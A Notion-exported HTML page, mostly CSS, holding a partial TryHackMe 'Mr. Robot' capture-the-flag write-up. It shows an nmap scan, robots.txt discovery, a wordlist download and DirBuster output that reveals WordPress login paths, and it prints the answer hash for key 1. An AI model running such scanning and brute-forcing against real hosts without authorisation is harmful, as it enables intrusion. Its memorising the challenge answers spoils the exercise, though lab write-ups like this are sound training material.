@@ -1,0 +1,926 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Mr. Robot</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="c7b6b4ed-9cb3-413b-9001-4d32061df64a" class="page sans"><header><img class="page-cover-image" src="https://static.wikia.nocookie.net/mrrobot/images/9/93/Season3Banner2b.jpg/revision/latest?cb=20171013091149" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg"/></div><h1 class="page-title">Mr. Robot</h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Label</th><td><span class="selected-value select-value-color-green">Medium</span><span class="selected-value select-value-color-purple">TryHackMe</span><span class="selected-value select-value-color-orange">Write-Ups</span></td></tr><tr class="property-row property-row-status"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesStatus"><path d="M8.75488 1.02344C8.75488 0.613281 8.41309 0.264648 8.00293 0.264648C7.59277 0.264648 7.25098 0.613281 7.25098 1.02344V3.11523C7.25098 3.51855 7.59277 3.86719 8.00293 3.86719C8.41309 3.86719 8.75488 3.51855 8.75488 3.11523V1.02344ZM3.91504 5.0293C4.20215 5.31641 4.69434 5.32324 4.97461 5.03613C5.26855 4.74902 5.26855 4.25684 4.98145 3.96973L3.53906 2.52051C3.25195 2.2334 2.7666 2.21973 2.47949 2.50684C2.19238 2.79395 2.18555 3.28613 2.47266 3.57324L3.91504 5.0293ZM10.9629 4.01758C10.6826 4.30469 10.6826 4.79688 10.9697 5.08398C11.2568 5.37109 11.749 5.36426 12.0361 5.07715L13.4854 3.62793C13.7725 3.34082 13.7725 2.84863 13.4785 2.55469C13.1982 2.27441 12.7061 2.27441 12.4189 2.56152L10.9629 4.01758ZM15.0234 8.78906C15.4336 8.78906 15.7822 8.44727 15.7822 8.03711C15.7822 7.62695 15.4336 7.28516 15.0234 7.28516H12.9385C12.5283 7.28516 12.1797 7.62695 12.1797 8.03711C12.1797 8.44727 12.5283 8.78906 12.9385 8.78906H15.0234ZM0.975586 7.28516C0.56543 7.28516 0.223633 7.62695 0.223633 8.03711C0.223633 8.44727 0.56543 8.78906 0.975586 8.78906H3.07422C3.48438 8.78906 3.83301 8.44727 3.83301 8.03711C3.83301 7.62695 3.48438 7.28516 3.07422 7.28516H0.975586ZM12.0361 10.9902C11.749 10.71 11.2568 10.71 10.9629 10.9971C10.6826 11.2842 10.6826 11.7764 10.9697 12.0635L12.4258 13.5127C12.7129 13.7998 13.2051 13.793 13.4922 13.5059C13.7793 13.2256 13.7725 12.7266 13.4854 12.4395L12.0361 10.9902ZM2.52051 12.4395C2.22656 12.7266 2.22656 13.2188 2.50684 13.5059C2.79395 13.793 3.28613 13.7998 3.57324 13.5127L5.02246 12.0703C5.31641 11.7832 5.31641 11.291 5.03613 11.0039C4.74902 10.7168 4.25684 10.71 3.96973 10.9971L2.52051 12.4395ZM8.75488 12.9658C8.75488 12.5557 8.41309 12.207 8.00293 12.207C7.59277 12.207 7.25098 12.5557 7.25098 12.9658V15.0576C7.25098 15.4609 7.59277 15.8096 8.00293 15.8096C8.41309 15.8096 8.75488 15.4609 8.75488 15.0576V12.9658Z"></path></svg></span>Status</th><td><span class="status-value select-value-color-green"><div class="status-dot status-dot-color-green"></div>Done</span></td></tr></tbody></table></header><div class="page-body"><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="5b9ce426-556d-474f-b09d-9e86a693a92d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Based on the Mr. Robot show, can you root this box?</div></figure><hr id="92a725ac-e09f-4120-bea2-a64bd21f00b3"/><figure id="bb74f6f4-7ea9-4fa7-99ce-9ea74d7bd2ba" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg"><img style="width:987px" src="https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Mr. Robot : THM </summary><div class="indented"><p id="99df77cd-dcb8-4098-9b0c-1a9d23e16206" class="">Write-Ups by : drew-byte</p><h2 id="01db3f27-a590-431f-9f7f-f0c3584b67b8" class="">Connection</h2><ul id="be8197e3-9f2f-4de2-92ea-c17963f88500" class="bulleted-list"><li style="list-style-type:disc">Download the ovpn provided by the thm</li></ul><ul id="dba2cf9a-7135-4d22-b25c-a5f80cdbc877" class="bulleted-list"><li style="list-style-type:disc">Run the ovpn</li></ul><pre id="b0b19db3-96e6-4a5c-8186-e85d6ddbedbb" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $cd Desktop
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $sudo openvpn shanetydraw.ovpn</code></pre><hr id="d4f65b0a-452e-4172-93a5-f1237d30e2ad"/><h2 id="f4fcf124-4196-43d5-92c9-248a47055e5d" class="">What is key 1?</h2><ul id="80109c88-3ce9-4fec-90ca-9a978cb4715f" class="bulleted-list"><li style="list-style-type:disc">scanning the ports and this is the results
+</li></ul><pre id="bb381056-e03a-45a2-9503-89868776fc1d" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $nmap -A -p- 10.10.42.50 -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 20:36 PST
+Nmap scan report for 10.10.42.50 (10.10.42.50)
+Host is up (0.38s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn&#x27;t have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 523.45 seconds</code></pre><ul id="f37d089f-f429-4188-b24d-5b228805d103" class="bulleted-list"><li style="list-style-type:disc">There are 3 ports 1 of them is closed and 2 of them is open 80/tcp and 443/tcp is open using the service of http and the version is apache httpd</li></ul><ul id="da3b8dd7-5fa0-46ae-a5d2-edae4b1adead" class="bulleted-list"><li style="list-style-type:disc">I tried to accessed the ip of the machine to the browser and this is the result</li></ul><figure id="2c2c27d8-e818-4ede-9039-9b11216696be" class="image"><a href="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled.png"><img style="width:1119px" src="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled.png"/></a></figure><ul id="b3401156-eedb-4d5b-8781-9a70161c86fb" class="bulleted-list"><li style="list-style-type:disc">When i input the commands there is video playing and pictures with information that are not useful in the thm the hint is ‘Robot’ so i tried to access the <a href="http://10.10.42.50.robots.txt">http://10.10.42.50.robots.txt</a> and this is the output </li></ul><p id="d7abc6cc-3e7f-4ee8-a749-01c52cd3ccc8" class="">
+</p><figure id="9695098b-e7f2-4a98-b689-b0393bbf7a7b" class="image"><a href="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%201.png"><img style="width:720px" src="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%201.png"/></a></figure><p id="0b86c554-54e5-421a-9de4-a8ef81656d97" class="">and now i tried to paste the “key-1-of-3.txt” and this is the output</p><figure id="35b8a9d9-f4cd-4572-ad2c-eaa4b1e4e2bb" class="image"><a href="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%202.png"><img style="width:974px" src="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%202.png"/></a></figure><p id="1f968046-7248-44c6-acb9-80d2d3de8e07" class="">ANSWER : 073403c8a58a1f80d943455fb30724b9</p><h2 id="0e7aec6b-6a9a-4968-aa3b-85f215993b23" class="">What is key 2?</h2><ul id="3d4181af-8d4d-46de-bf94-4108be4829d8" class="bulleted-list"><li style="list-style-type:disc">When i paste the fsocity.dic in to my directory this is the output</li></ul><figure id="dc386b9e-6f60-400e-b33b-12ce846b078e" class="image"><a href="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%203.png"><img style="width:964px" src="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%203.png"/></a></figure><p id="2fd7bf0b-c027-4282-af8a-1a01335758ea" class="">and I download the file and after I downloaded the file this is the content</p><figure id="8007988f-a1d8-4f87-a3dc-3c98aa88308e" class="image"><a href="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%204.png"><img style="width:955px" src="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%204.png"/></a></figure><p id="d86f412e-a7c3-45a9-a25d-0ba24b46e8ca" class="">a text file that has a line of text of 858160</p><ul id="51f2d586-4db3-4efc-a498-7f5bd4951afe" class="bulleted-list"><li style="list-style-type:disc">I use dirbuster to scan any hidden directory and I used the fsocity.dic to it</li></ul><pre id="28f6c1ff-362a-4651-a25b-d8050e34dd94" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $dirbuster
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+INFO: Retrying request
+Dir found: /css/ - 403
+Dir found: /images/ - 403
+INFO: Retrying request
+Dir found: /video/ - 403
+Dir found: /image/ - 200
+INFO: Retrying request
+Dir found: /audio/ - 403
+INFO: Retrying request
+Dir found: /js/ - 403
+INFO: Retrying request
+Dir found: /js/vendor/ - 403
+Dir found: /image/1199146/ - 200
+Dir found: /image/2015/ - 200
+Dir found: /image/160/ - 200
+Dir found: /image/600/ - 200
+Dir found: /image/285/ - 200
+Dir found: /image/000000/ - 200
+INFO: Retrying request
+File found: /wp-login.php - 200
+File found: /js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js - 200
+Dir found: /admin/ - 200
+Dir found: /image/feed/ - 301
+Dir found: /image/1200/ - 200
+Dir found: /image/110/ - 200
+INFO: Retrying request
+Dir found: /video/feed/ - 200
+Dir found: /image/500/ - 200
+Dir found: /image/250/ - 200
+Dir found: /comments/feed/ - 200
+Dir found: /css/feed/ - 200
+Dir found: /admin/js/ - 403
+Dir found: /image/111/ - 200
+Dir found: /image/828/ - 200
+Dir found: /image/829/ - 200
+Dir found: /image/2048/ - 200
+File found: /js/s_code.js.pagespeed.jm.I78cfHQpbQ.js - 200
+Dir found: /image/501/ - 200
+Dir found: /image/502/ - 200
+Dir found: /wp-content/ - 200
